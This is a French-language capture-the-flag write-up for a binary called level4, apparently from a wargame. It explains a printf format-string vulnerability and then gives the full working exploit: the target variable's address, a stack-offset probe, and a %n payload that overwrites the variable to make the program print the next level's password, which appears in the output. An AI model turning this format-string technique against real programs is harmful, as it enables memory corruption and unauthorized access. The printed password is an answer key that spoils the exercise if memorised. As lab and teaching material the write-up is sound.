#### Etape 1: Décompilation / Compréhension du programme.

Le programme appelle une fonction *n()*
Celle-ci contient un fgets, et fais un appel a la fonction *p()*, qui elle-meme prend le pointeur passer en parametre et l'utilise comme seul argument de printf.
Etant un pointeur la valeur peut etre modifier dans le printf. A la sortie de la fonction p() , n() reprend et compare la valeur d'une variable globale qui si elle est égale a 16930116 éxécute un *cat* sur le fichier *.pass* du niveau suivant

#### Etape 2: Identification des vulnérabilités

On répère les mêmes vulnérabilités que dans le précédent level.

#### Etape 3 : Plan d'attaque

Comme précédement nous pouvons donc passez au fgets l'adresse de la variable globale et faire en sorte de modifier sa valeur grâce au %n qui modifie la variable, elle devient le nombre de caractères écris auparavant.

#### Etape 4 : Récolte d'informations

Il va donc falloir trouver l'adresse de la variable globale (nommée *m* dans le binaire) sur Ghidra on obtient : 08049810.

Il faut ensuite trouver a quel moment dans la stack la valeur que nous écrivons est appelée.

```bash
python -c 'print "aaaa" + "%x "*20' | ./level4 
aaaab7ff26b0 bffff694 b7fd0ff4 0 0 bffff658 804848d bffff450 200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 
```

Notre valeur est donc la 12e adresse.

Nous devrons donc écrire 16930116 caractére a la 12e adresse, Il existe une syntaxe comme dans grep pour passer directement a la 12e adresse : 12$.

#### Etape 5 : Execution

```bash
python -c 'print "\x10\x98\x04\x08" +  "%16930112x" + "%12$n"' | ./level4
[...]
            b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

